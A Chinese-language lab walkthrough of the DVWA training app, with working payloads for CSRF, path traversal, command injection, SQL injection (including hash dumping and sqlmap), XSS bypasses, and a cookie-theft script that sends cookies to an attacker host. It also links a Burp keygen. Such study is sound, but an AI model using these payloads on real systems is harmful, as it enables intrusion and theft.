CSRF\u003e 跨站请求伪造 CSRF # CSRF 全称 Cross Site Request Forgery，跨站点请求伪造，攻击者通过跨站请求，以合法的用户身份进行非法操作，如转账交易、发表评论等。其核心是利用了浏览器 Cookie 或服务器的 Session 策略，盗取用户的身份信息\nlow\u003e low # 抓包查看\n此时在另一个窗口打开这个链接，是可以打开该页面的。但是如果换一个浏览器就不可以\n因此该攻击的难点在于诱骗受害者点击具有转账或者修改功能的链接\nmedium\u003e medium # 查看源码\n因此我们需要从本站诱导用户点击带有HTTP_REFERER 的链接\n这可以结合XSS来实现，先在本站下新建一个具有XSS漏洞的文件，这可以通过命令注入实现，以提供基础条件\n127.0.0.1|echo \u0026quot;\u0026lt;?php echo $_GET['x'];\u0026quot; \u0026gt; /var/www/html/vulnerabilities/csrf/xss.php\n这个页面会显示接收的参数，但是如果在里面写入代码，就会被解析\n例如http://127.0.0.1/vulnerabilities/csrf/xss.php?x=%3Cimg%20src=%221%22%3E\n![image-20221125142406766](D:\\OneDrive - mail.ynu.edu.cn\\note\\typoranote\\DVWA.assets\\image-20221125142406766.png)\n查看请求记录，可以看到src=1被请求了，并且相应的信息也都是携带的\n那么，我们就可以将其变为修改密码的请求链接，即\nhttp://127.0.0.1/vulnerabilities/csrf/xss.php?x=\u0026lt;img src=\u0026#34;http://127.0.0.1/vulnerabilities/csrf/?password_new=password\u0026amp;password_conf=password\u0026amp;Change=Change\u0026#34;\u0026gt; 还需要编码 http%3A%2F%2F127.0.0.1%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dpassword%26password_conf%3Dpassword%26Change%3DChange 即最终的链接为 http://127.0.0.1/vulnerabilities/csrf/xss.php?x=\u0026lt;img src=\u0026#34;http%3A%2F%2F127.0.0.1%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dpassword%26password_conf%3Dpassword%26Change%3DChange\u0026#34;\u0026gt; 发起请求\n可以看到修改密码的请求状态码为200，表示攻击成功\nhigh\u003e high # 获取请求链接，发现多了一个参数user_token\nhttp://127.0.0.1/vulnerabilities/csrf/?password_new=password\u0026amp;password_conf=password\u0026amp;Change=Change\u0026amp;user_token=aab541b1f7939ab38e862c7f5c565a0e 同样需要xss注入，这次请求图片已经不够用了，需要请求.js文件，里面编写代码，获取token并发起修改密码请求\nimpossible\u003e impossible # 我都知道当前密码了，为什么还用这个漏洞，因此这是impossible\n总结与防御\u003e 总结与防御 # ​\tCSRF 跨站请求伪造攻击是攻击者利用目标用户的身份，以目标用户的名义执行某些错误操作的攻击方式，会极大地威胁用户的权益。CSRF 攻击的 2 个重点是：\n目标用户登录了网站，并且能正常执行该网站的操作； 目标用户访问了攻击者制作的攻击页面。 ​\tCSRF 漏洞的防御方式是验证请求的 Referer 字段值，如果该字段值是以自己的网站开头的域名，则说明该请求是来源于自己，就可以通过验证进行访问。当该字段值是其他网页的域名或者空白时，就说明这有可能是 CSRF 攻击，这时候就应该拒绝这个请求。 ​\t不过这种方法能起到的作用有限，因为攻击者可以用其他方式绕过验证。还有一种更合适的方式是在请求中放入攻击者不能够伪造的信息，例如使用 Anti-CSRF token 机制，让访问者需要通过一个随机生成的 token 进行验证。还有可以通过一些密保问题，因为这些问题的答案理论上只有访问者自己知道，攻击者也无法伪造。\n文件包含 File Inclusion\u003e 文件包含 File Inclusion # low\u003e low # 并没有做其他的过滤，因此输入的只要是个文件路径都可以被查看，借此可以看到其他敏感文件\n比如输入http://127.0.0.1/vulnerabilities/fi/?page=../../../../../../../../../../../../etc/passwd\nmedium\u003e medium # 分析源码\n只是一个简单的过滤，http://127.0.0.1/vulnerabilities/fi/?page=....//....//....//....//....//....//....//etc/passwd\n可以看到，这样也是可以访问的\n除了查看文件，还可以远程下载文件，或者打开网页，下载文件的同时是可以执行文件的，如果文件中是一句话木马，那么终端控制权就会到手\nhigh\u003e high # 限制上传的文件名只能以file开头\nphp有一个函数也是以file开头的，可以借此查看其他的文件\nimpossible\u003e impossible # 限制了只能输入四个允许文件名\n总结与防御\u003e 总结与防御 # ​\t为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了文件包含漏洞，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。常用的文件包含函数有 include()、include_once()、require()、require_once()。 ​\t包含漏洞分为本地包含和原创包含 2 类，当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容不符合 php 语法，会直接将文件内容输出。例如下面这段简易的代码：\nCopy Highlighter-hljs\u0026lt;?php $file = $_GET[\u0026#39;file\u0026#39;]; include($file); ?\u0026gt; 当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀不能与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：\nCopy Highlighter-hljsallow_url_include = on（是否允许 include/require 远程文件） allow_url_fopen = on（是否允许打开远程文件） 文件上传 File Upload\u003e 文件上传 File Upload # low\u003e low # 唯一的限制条件就是文件大小，还是在前端，用F12改一下就可以了\nmedium\u003e medium # 通过数据报获取信息，因此可以通过重放数据报来达到上传其他类型文件的目的\n可以看到可以通过校验的字段是image/png 或image/jpeg\n尝试上传其他类型文件\n使用bs拦截并修改报文\n成功上传\n尝试访问\n未报错，攻击成功\nhigh\u003e high # 源码分析\nif( ( strtolower( $uploaded_ext ) == \u0026#34;jpg\u0026#34; || strtolower( $uploaded_ext ) == \u0026#34;jpeg\u0026#34; || strtolower( $uploaded_ext ) == \u0026#34;png\u0026#34; ) \u0026amp;\u0026amp; ( $uploaded_size \u0026lt; 100000 ) \u0026amp;\u0026amp; getimagesize( $uploaded_tmp ) ) { 以上代码审查了文件后缀、文件大小、图片是否是真的，因此需要上传真正的、可以打开的图片文件，因此需要上传图片木马。 如何在图片中写入恶意代码？ 可以在图片中的注释信息添加php代码，这样php的include函数解析二进制文件时发现这是php代码，就会执行它。 借助小工具edjpgcom可以嵌入恶意代码 这样木马图片就可以被成功上传，但是想要执行，还是需要文件包含漏洞 impossible\u003e impossible # 源码分析\n加入user_token\n生成md5作为新的文件名，并且成功上传的时候不会显示路径，只有名字\n$target_file = md5( uniqid() . $uploaded_name ) . \u0026#39;.\u0026#39; . $uploaded_ext; 限制文件后缀、大小，以及检查是否能打开\n满足以上要求的图片会被重写，注释全被删除，只留下图片本身的信息，以及销毁源图片。\n// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == \u0026#39;image/jpeg\u0026#39; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); 总结与防御\u003e 总结与防御 # ​\t在向网页上传文件时，如果服务器端代码未对客户端上传的文件进行严格的验证和过滤，就容易被上传上来的脚本文件等木马攻击。这类脚本称之为 WebShell，用户可以利用这种恶意脚本查看服务器目录、修改服务器文件和执行系统命令等。 为了防御这种攻击，可以使用白名单判断文件类型和后缀是否合法，同时对上传后的文件进行重命名防止被攻击者利用。\nnsecure CAPTCHA （不安全的验证码）\u003e nsecure CAPTCHA （不安全的验证码） # 配置文件\nvim /var/www/html/config/config.inc.php $_DVWA[ \u0026#39;recaptcha_public_key\u0026#39; ] = \u0026#39;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg\u0026#39;; $_DVWA[ \u0026#39;recaptcha_private_key\u0026#39; ] = \u0026#39;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ\u0026#39;; docker cp D:\\config.inc.php d45:/var/www/html/config/config.inc.php low\u003e low # 发起请求，抓包查看请求参数\nstep=1\u0026amp;password_new=1\u0026amp;password_conf=1\u0026amp;Change=Change 可以看到除了密码外，还有step和Change两个参数，可以推断这两个参数就是验证方法\n而这两个参数都是可以通过抓包重放修改的，这里就将1改为2\n攻击成功\n源码分析，主要以两个if判断分为两个部分只要step为2，就可以修改成功\nif( isset( $_POST[ \u0026#39;Change\u0026#39; ] ) \u0026amp;\u0026amp; ( $_POST[ \u0026#39;step\u0026#39; ] == \u0026#39;1\u0026#39; ) ) // 修改失败 //The CAPTCHA was incorrect. Please try again. if( isset( $_POST[ \u0026#39;Change\u0026#39; ] ) \u0026amp;\u0026amp; ( $_POST[ \u0026#39;step\u0026#39; ] == \u0026#39;2\u0026#39; ) ) // 修改成功 //echo \u0026#34;\u0026lt;pre\u0026gt;Password Changed.\u0026lt;/pre\u0026gt;\u0026#34;; medium\u003e medium # step=1\u0026amp;password_new=1\u0026amp;password_conf=1\u0026amp;g-recaptcha-response=\u0026amp;Change=Change 新增参数recaptcha-response\n源码分析\n发现多了对passed_captcha的判断，这同样是可以通过抓包重放修改的\nif( !$_POST[ \u0026#39;passed_captcha\u0026#39; ] ) { $html .= \u0026#34;\u0026lt;pre\u0026gt;\u0026lt;br /\u0026gt;You have not passed the CAPTCHA.\u0026lt;/pre\u0026gt;\u0026#34;; $hide_form = false; return; } 发起攻击\n将参数改为\nstep=2\u0026amp;password_new=1\u0026amp;password_conf=1\u0026amp;Change=Change\u0026amp;passed_captcha=true high\u003e high # 抓包找参数\nstep=1\u0026amp;password_new=1\u0026amp;password_conf=1\u0026amp;g-recaptcha-response=\u0026amp;user_token=b40afe8549509540f680f64bbed5d3cf\u0026amp;Change=Change 源码分析\nif ( $resp || ( $_POST[ \u0026#39;g-recaptcha-response\u0026#39; ] == \u0026#39;hidd3n_valu3\u0026#39; \u0026amp;\u0026amp; $_SERVER[ \u0026#39;HTTP_USER_AGENT\u0026#39; ] == \u0026#39;reCAPTCHA\u0026#39; ) ) 同样是抓包修改参数HTTP_USER_AGENT和g-recaptcha-response\nUser-Agent: reCAPTCHA step=1\u0026amp;password_new=1\u0026amp;password_conf=1\u0026amp;g-recaptcha-response=hidd3n_valu3\u0026amp;user_token=73c5e811ef332d2556e6a7b87151ff2c\u0026amp;Change=Change 攻击成功\nimpossible\u003e impossible # 同样的，我都知道当前密码了，还破解什么\nSQL Injection（SQL注入）\u003e SQL Injection（SQL注入） # 联合查询注入、报错注入、时间盲注、布尔盲注\nlow\u003e low # 报错注入\n先确定有没有报错信息\n输入'1\u0026rsquo;，可以看到错误信息\n![image-20221130234655912](D:\\OneDrive - mail.ynu.edu.cn\\note\\typoranote\\DVWA.assets\\image-20221130234655912.png)\n因此可以使用报错注入\n使用函数updatexml()和concat()构造sql语句\nupdatexml()可以将报错信息返回\nconcat()本身是一个字符串拼接函数，同时可以执行SQL语句\n-- 发起请求的模式 只需要修改\u0026#39;abc\u0026#39;即可 http://127.0.0.1/vulnerabilities/sqli/?id=\u0026#39; and updatexml(1,concat(\u0026#39;!\u0026#39;,(\u0026#39;abc\u0026#39;),\u0026#39;!\u0026#39;),1) -- \u0026amp;Submit=Submit 报错信息形如\n获取当前以及其他所有数据库\n-- 当前 http://127.0.0.1/vulnerabilities/sqli/?id=\u0026#39; and updatexml(1,concat(\u0026#39;!\u0026#39;,( database() ),\u0026#39;!\u0026#39;),1) -- \u0026amp;Submit=Submit -- 返回信息：XPATH syntax error: \u0026#39;!dvwa!\u0026#39; -- 其他 http://127.0.0.1/vulnerabilities/sqli/?id=\u0026#39; and updatexml(1,concat(\u0026#39;!\u0026#39;,( select schema_name from information_schema.schemata limit 0,1 ),\u0026#39;!\u0026#39;),1) -- \u0026amp;Submit=Submit -- limit 0,1 返回信息：XPATH syntax error: \u0026#39;!dvwa!\u0026#39; -- limit 1,1 返回信息：XPATH syntax error: \u0026#39;!information_schema!\u0026#39; 获取指定数据库中的表\nhttp://127.0.0.1/vulnerabilities/sqli/?id=\u0026#39; and updatexml(1,concat(\u0026#39;!\u0026#39;,( select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 1,1 ),\u0026#39;!\u0026#39;),1) -- \u0026amp;Submit=Submit -- XPATH syntax error: \u0026#39;!guestbook!\u0026#39; -- XPATH syntax error: \u0026#39;!users!\u0026#39; 获取指定库中指定表的字段\nhttp://127.0.0.1/vulnerabilities/sqli/?id=\u0026#39; and updatexml(1,concat(\u0026#39;!\u0026#39;,( select column_name from information_schema.columns where table_schema=\u0026#39;dvwa\u0026#39; and table_name=\u0026#39;users\u0026#39; limit 3,1 ),\u0026#39;!\u0026#39;),1) -- \u0026amp;Submit=Submit --limit 3,1 \u0026gt; XPATH syntax error: \u0026#39;!user!\u0026#39; --limit 4,1 \u0026gt; XPATH syntax error: \u0026#39;!password!\u0026#39; 获取指定库中指定表指定字段的值\nhttp://127.0.0.1/vulnerabilities/sqli/?id=\u0026#39; and updatexml(1,concat(\u0026#39;!\u0026#39;,( select user from dvwa.users limit 0,1 ),\u0026#39;!\u0026#39;),1) -- \u0026amp;Submit=Submit -- XPATH syntax error: \u0026#39;!admin!\u0026#39; http://127.0.0.1/vulnerabilities/sqli/?id=\u0026#39; and updatexml(1,concat(\u0026#39;\u0026#39;,( select password from dvwa.users limit 0,1 ),\u0026#39;\u0026#39;),1) -- \u0026amp;Submit=Submit -- XPATH syntax error: \u0026#39;f4dcc3b5aa765d61d8327deb882cf99\u0026#39; 至此，攻击成功\nmedium\u003e medium # 中级难度改成了下拉选择框，这属于前端校验，还需要看看后端校验\n源码分析\n$id = mysqli_real_escape_string($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $id); 可以发现多了该行代码，作用是对SQL语句中的单引号和双引号进行转义，转义后就变为了普通的字符，不具备本来的功能了\n$query = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = $id;\u0026#34;; 还可以发现id变为了数字型\n解决办法： 使用十六进制，将所有引号删除，并将其中的句子转为十六进制\n发起攻击\n-- 原语句 id=\u0026#39; and updatexml(1,concat(\u0026#39;\u0026#39;,(select password from dvwa.users limit 0,1),\u0026#39;\u0026#39;),1) -- \u0026amp;Submit=Submit -- 修改后 id=2 and updatexml(1,concat((select password from dvwa.users limit 0,1)),1)\u0026amp;Submit=Submit 攻击成功\nhigh\u003e high # 源码分析\n前端校验，弹出了一个新的框，使得机器测试无效，但是依旧可以手工注入 后端校验 依旧对输入的id不做任何校验 关闭了报错提示，因此无法使用报错注入，但是可以使用联合查询注入 group_concat() 函数把查询结果合并成一个字符串返回\n1 or 1 = 1 union select group_concat(user_id),group_concat(password) from users #\n1' union select group_concat(user),group_concat(password) from users #\nimpossible\u003e impossible # 查询被改为参数化查询（而不是动态的），这意味着查询已由开发人员确切定义，并区分哪些部分是代码，哪些部分是数据。\nImpossible 级别的代码采用了 PDO 技术，防止代码和查询数据的混杂。同时当返回的查询结果数量为一时才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken 机制的加入了进一步提高了安全性。\n总结与防御\u003e 总结与防御 # SQL 注入攻击就是 Web 程序对用户的输入没有进行合法性判断，从而攻击者可以从前端向后端传入攻击参数，并且该参数被带入了后端执行。在很多情况下开发者会使用动态的 SQL 语句，这种语句是在程序执行过程中构造的，不过动态的 SQL 语句很容易被攻击者传入的参数改变其原本的功能。 当我们进行手工 SQL 注入时，往往是采取以下几个步骤：\n判断是否存在注入，注入是字符型还是数字型 猜解SQL查询语句中的字段数； 确定显示的字段顺序； 获取当前数据库； 获取数据库中的表； 获取表中的字段名； 下载数据。 当开发者需要防御 SQL 注入攻击时，可以采用以下方法。\n过滤危险字符：可以使用正则表达式匹配各种 SQL 子句，例如 select,union,where 等，如果匹配到则退出程序。 使用预编译语句：PDO 提供了一个数据访问抽象层，这意味着不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。使用 PDO 预编译语句应该使用占位符进行数据库的操作，而不是直接将变量拼接进去。 SQL Injection Blind（SQL盲注）\u003e SQL Injection Blind（SQL盲注） # 布尔盲注：bool 盲注是在不知道 SQL 查询的返回值，但是知道查询是否成功的情况下，猜测数据库中的敏感信息的手法。\n时间盲注： 提交对执行时间敏感的函数sql语句，或者使用if语句，通过执行时间的长短来判断是否执行成功，比如:正确的话会导致时间很长，错误的话会导致执行时间很短。\n经常使用的函数\nmid(str,start,length) :字符串截取 ORD() ascii :转换成ascii码 Length() :统计长度 version() :查看数据库版本 database() :查看当前数据库名 user() :查看当前用户 Sleep() :延迟函数 If(condition,true,false) :条件语句 low\u003e low # 使用sqlmap\u003e 使用sqlmap # # 1.查询是否存在注入点 sqlmap -u \u0026#34;http://127.0.0.1/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit\u0026#34; # 2.检测站点包含哪些数据库 -dbs # 3.获取当前数据库名 -current-db # 4.获取指定数据库中的表名 -tables -D \u0026#39;db_name\u0026#39; # 5.获取表中的字段 -columns -T \u0026#39;table_name\u0026#39; -D \u0026#39;db_name\u0026#39; # 6.获取字段的内容 –dump -C “columns_name” -T “table_name” -D “db_name” sqlmap -u \u0026#34;http://127.0.0.1/vulnerabilities/sqli_blind/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;security=low; PHPSESSID=95olg0v4v82ig83g1uv5kkscq2\u0026#34; --batch sqlmap -u \u0026#34;http://127.0.0.1/vulnerabilities/sqli_blind/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;security=low; PHPSESSID=95olg0v4v82ig83g1uv5kkscq2\u0026#34; --batch --dbs --current-db --batch -D dvwa -T users -C \u0026#34;user,password\u0026#34; -dump medium\u003e medium # 从中级难度开始，sqlmap就找不出注入点了\n判断注入类型 字符 or 数字\n-- 若服务器响应时间大于 3 秒，说明 sleep() 函数被执行 1 and sleep(3) # 数字 1\u0026#39; and sleep(3) # 字符 ![image-20221201221048686](D:\\OneDrive - mail.ynu.edu.cn\\note\\typoranote\\DVWA.assets\\image-20221201221048686.png)\n获取数据库名\n先获取长度\nid=1 and length(database())=4 # \u0026amp;Submit=Submit or id=1 and if(length(database())=4,sleep(3),1) # \u0026amp;Submit=Submit 返回exits或发生延时，说明长度为4\n![image-20221201225400230](D:\\OneDrive - mail.ynu.edu.cn\\note\\typoranote\\DVWA.assets\\image-20221201225400230.png)\n再逐个尝试具体的字符（有单引号的地方都需要被替换，这里使用ASCII码）\n-- 采用二分法的方式逼近答案 -- \u0026gt;a id=1 and ascii(substr(database(),1,1))\u0026gt;97# \u0026amp;Submit=Submit -- \u0026lt;z id=1 and ascii(substr(database(),1,1))\u0026lt;123# \u0026amp;Submit=Submit -- \u0026lt;n id=1 and ascii(substr(database(),1,1))\u0026lt;110# \u0026amp;Submit=Submit -- 时间盲注 形如 id=1 and if((ascii(substr(database(),1,1))\u0026lt;110),sleep(3),1)# \u0026amp;Submit=Submit ​\t以此类推可以得出结果dvwa\n猜表的个数\nid=1 and (select count(table_name) from information_schema.tables where table_schema=0x64767761)=2# \u0026amp;Submit=Submit 猜表的表名长度\nid=1 and length(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 0,1),1))=9# \u0026amp;Submit=Submit 猜表名\nid=1 and ascii(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 1,1),1))=117# high\u003e high # 分析源码\n弹出新框，不能使用脚本\n随机等待时间，不能使用时间盲注，但是还是可以用布尔盲注\nif( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } impossible\u003e impossible # 使用预编译语句\n总结与防御\u003e 总结与防御 # SQL 注入攻击就是 Web 程序对用户的输入没有进行合法性判断，从而攻击者可以从前端向后端传入攻击参数，并且该参数被带入了后端执行。在很多情况下开发者会使用动态的 SQL 语句，这种语句是在程序执行过程中构造的，不过动态的 SQL 语句很容易被攻击者传入的参数改变其原本的功能。SQL 盲注入与普通 SQL 注入相同，只是当攻击者试图利用应用程序进行攻击时，得到的不是有用的报错信息，而是开发人员指定的通用页面。 当我们进行SQL 盲注时，往往是采取以下几个步骤：\n判断是否存在注入，注入是字符型还是数字型； 猜解当前数据库名； 猜解数据库中的表名； 猜解表中的字段名； 猜解数据。 防御 SQL 注入攻击，可以采用以下方法。\n过滤危险字符 使用预编译语句 XSS（Reflected）（反射型跨站脚本）\u003e XSS（Reflected）（反射型跨站脚本） # low\u003e low # 分析源码可以发现，服务器只是判断了 name 参数是否为空，如果不为空的话就直接打印出来。服务器并没有对 name 参数做任何的过滤和检查，存在明显的 XSS 漏洞。\n偷取cookies \u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; medium\u003e medium # 源码审计\n对\u0026lt;script\u0026gt; 进行简单的替换，可以通过双写绕过\n$name = str_replace( \u0026#39;\u0026lt;script\u0026gt;\u0026#39;, \u0026#39;\u0026#39;, $_GET[ \u0026#39;name\u0026#39; ] ); 发起攻击\n\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; 改为 \u0026lt;scr\u0026lt;script\u0026gt;ipt\u0026gt;alert(document.cookie)\u0026lt;/scr\u0026lt;script\u0026gt;ipt\u0026gt; high\u003e high # 源码审计\n$name = preg_replace( \u0026#39;/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i\u0026#39;, \u0026#39;\u0026#39;, $_GET[ \u0026#39;name\u0026#39; ] ); 可以不用\u0026lt;script\u0026gt;标签\n发起攻击\n\u0026lt;img src = 1 onerror = alert(document.cookie)\u0026gt; impossible\u003e impossible # 源码审计\n// Check Anti-CSRF token checkToken($_REQUEST[\u0026#39;user_token\u0026#39;], $_SESSION[\u0026#39;session_token\u0026#39;], \u0026#39;index.php\u0026#39; ); // Get input $name = htmlspecialchars($_GET[\u0026#39;name\u0026#39;]); htmlspecialchars() 函数用于把预定义的字符 \u0026ldquo;\u0026lt;\u0026rdquo; 和 \u0026ldquo;\u0026gt;\u0026rdquo; 转换为 HTML 实体，防止了我们注入 HTML 标签。 加入 Anti-CSRF token 防护 CSRF 攻击 总结与防御\u003e 总结与防御 # ​\t跨站脚本 (Cross-Site Scripting) 是一种针对 Web 程序的代码注入型漏洞攻击，它允许攻击者将恶意脚本注入网页，使得其他用户浏览网页时收到影响。所谓反射型 XSS 就是提交了恶意脚本实现的 XSS 仅对这次访问产生了影响，并非持久性的 XSS 攻击。 ​\tXSS 的攻击方式为攻击者请求一个带有 payload 的 URL，服务器的响应不会以任何形式包含攻击者的脚本。XSS 漏洞的修复方式有以下 2 种：\n过滤输入的字符，例如 “ \u0026rsquo; ”，“ \u0026quot; ”，“\u0026lt;”，“\u0026gt;” 等非法字符； 对输出到页面的数据进行编码。 XSS（Stored）（存储型跨站脚本）\u003e XSS（Stored）（存储型跨站脚本） # 存储型 XSS 存储在数据库中，直到数据库被重置或者负载被手动删除。\nlow\u003e low # 源码审计\n输入一个名字和一段文本，然后网页把输入的信息加入到数据库中，同时服务器也会将服务器的内容回显到网页上。\n\u0026lt;?php if(isset($_POST[\u0026#39;btnSign\u0026#39;])){ // Get input // trim(string,charlist) 函数用于移除字符串两侧的空白字符或其他预定义字符 $message = trim($_POST[\u0026#39;mtxMessage\u0026#39;]); $name = trim($_POST[\u0026#39;txtName\u0026#39;]); // stripslashes() 函数用于删除反斜杠，可用于清理从数据库中或者从 HTML 表单中取回的数据。 $message = stripslashes($message); // mysqli_real_escape_string() 函数用于对字符串中的特殊字符进行转义，使得这个字符串是一个合法的 SQL 语句。 // GLOBALS 是引用全局作用域中可用的全部变量，是一个包含了全部变量的全局组合数组。 // Sanitize message input $message = ((isset($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_real_escape_string($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $message ) : ((trigger_error(\u0026#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026#34;, E_USER_ERROR)) ? \u0026#34;\u0026#34; : \u0026#34;\u0026#34;)); // Sanitize name input $name = ((isset($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_real_escape_string($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $name ) : ((trigger_error(\u0026#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026#34;, E_USER_ERROR)) ? \u0026#34;\u0026#34; : \u0026#34;\u0026#34;)); // Update database $query = \u0026#34;INSERT INTO guestbook ( comment, name ) VALUES ( \u0026#39;$message\u0026#39;, \u0026#39;$name\u0026#39; );\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $query ) or die( \u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . ((is_object($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;])) ? mysqli_error($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39; ); //mysql_close(); } ?\u0026gt; 由于对输入内容没有任何过滤，因此可以注入任意的代码\n尝试以下代码，发现不行\n\u0026lt;script\u0026gt;alert(\u0026#39;document.cookie\u0026#39;)\u0026lt;/script\u0026gt; 因为使用了trim(string,charlist)，所以并没有cookie弹出，将字符串编码即可\n\u0026lt;script\u0026gt;alert(0x646F63756D656E742E636F6F6B6965)\u0026lt;/script\u0026gt; \u0026lt;img src=5 onerror=alert(0x646F63756D656E742E636F6F6B6965)\u0026gt; 在另一台攻击机上获取靶机的cookie\n新建一台攻击机，端口设为4567\ndocker run --rm -it -p 4567:80 vulnerables/web-dvwa 在该攻击机指定路径写入脚本cookie.php\n该脚本能够获取cookie并存入./cookie.txt\n\u0026lt;?php $cookie = $_GET[\u0026#39;cookie\u0026#39;]; $ip = getenv(\u0026#39;REMOTE_ADDR\u0026#39;); $time = date(\u0026#39;Y-m-d g:i:s\u0026#39;); $ref =getenv(\u0026#39;HTTP_REFERER\u0026#39;); $fp = fopen(\u0026#39;cookie.txt\u0026#39;,\u0026#39;a\u0026#39;); fwrite($fp,\u0026#34; IP: \u0026#34; .$ip. \u0026#34;\\r\\n Time: \u0026#34; .$time. \u0026#34;\\r\\n Referer: \u0026#34; .$ref. \u0026#34;\\r\\n $cookie: \u0026#34; .$cookie. \u0026#34;\\r\\n-------------\\r\\n\u0026#34;); fclose($fp); ?\u0026gt; docker cp D:\\cookie.php 4a8:/var/www/html 发起攻击，在靶场写入\n\u0026lt;script\u0026gt;document.write(\u0026#39;\u0026lt;img src=\u0026#34;http://127.0.0.1:4567/cookie.php?cookie=\u0026#39; + document.cookie + \u0026#39;\u0026#34; width=0 height=0 border=0 /\u0026gt;\u0026#39;);\u0026lt;/script\u0026gt; 回到攻击机下查看/var/www/html/cookie.txt\ncat /var/www/html/cookie.txt medium\u003e medium # 源码审计\naddslashes() 函数在每个双引号前添加反斜杠，返回在预定义字符之前添加反斜杠的字符串。\nstrip_tags() 函数用于剥去字符串中的 HTML、XML 以及 PHP 的标签\nhtmlspecialchars() 函数用于把预定义的字符 \u0026ldquo;\u0026lt;\u0026rdquo; 和 \u0026ldquo;\u0026gt;\u0026rdquo; 转换为 HTML 实体。\nMessage 参数对所有的 XSS 都进行了过滤\nname 参数只是过滤了 \u0026lt; script \u0026gt; 标签\n因此，我们可以对 name 参数进行注入。\n修改前端限制的长度\n构造注入语句\n使用双写或者大写绕过\n\u0026lt;SCRIPT\u0026gt;alert(0x646F63756D656E742E636F6F6B6965)\u0026lt;/SCRIPT\u0026gt; \u0026lt;sc\u0026lt;script\u0026gt;ript\u0026gt;alert(0x646F63756D656E742E636F6F6B6965)\u0026lt;/sc\u0026lt;script\u0026gt;ript\u0026gt; 攻击成功\nhigh\u003e high # 源码审计\npreg_replace() 函数执行一个正则表达式的搜索和替换，“*” 代表一个或多个任意字符，“i” 代表不区分大小写。也就是说 name 参数 “\u0026lt; script \u0026gt;” 标签在这里被完全过滤了，但是我们可以通过其他的标签例如 img、body 等标签的事件或者iframe 等标签的 src 注入 JS 攻击脚本\n构造语句\n\u0026lt;img src=5 onerror=alert(0x646F63756D656E742E636F6F6B6965)\u0026gt; impossible\u003e impossible # 源码审计\n使用内置的PHP函数（例如 “htmlspecialchars()”），可以转义任何会改变输入行为的值。 源码在 high 级别的基础上对 name 参数也进行了更严格的过滤，导致 name 参数也无法进行 JS 脚本注入 加入 Anti-CSRF token 防护 CSRF 攻击，进一步提高安全性。 总结与防御\u003e 总结与防御 # ​\t跨站脚本 (Cross-Site Scripting) 是一种针对 Web 程序的代码注入型漏洞攻击，它允许攻击者将恶意脚本注入网页，使得其他用户浏览网页时收到影响。所谓存储型 XSS 又称为持久型 XSS，攻击脚本会被永久保存在目标服务器的数据库或文件中，具有更高的隐蔽性。 ​\t存储型 XSS 的攻击常见于论坛、博客或留言等需要提交文本的页面，攻击者将攻击脚本和文本一起注入。当文本被服务器存储下来时，恶意脚本也会被永久存放与服务器的数据库或文件中。当其他用户访问这个含有恶意脚本的页面时，恶意脚本会在用户的浏览器中执行。XSS 漏洞的修复方式有以下 2 种：\n过滤输入的字符，例如 “ \u0026rsquo; ”，“ \u0026quot; ”，“\u0026lt;”，“\u0026gt;” 等非法字符； 对输出到页面的数据进行编码。 ","date":"2022-09-03","permalink":"/docs/dvwa/","section":"Docs","summary":"环境搭建\u003e 环境搭建 # kali + docker\ndocker run --rm -it -p 80:80 vulnerables/web-dvwa 打开网页 http://127.0.0.1/index.php\n点击Create / Reset database\nUsername：admin Password：password\n安装及配置BurpSuite\u003e 安装及配置BurpSuite # 下载所需要的文件\nReleases · h3110w0r1d-y/BurpLoaderKeygen (github.com)\n​\tBurp Suite Release Notes 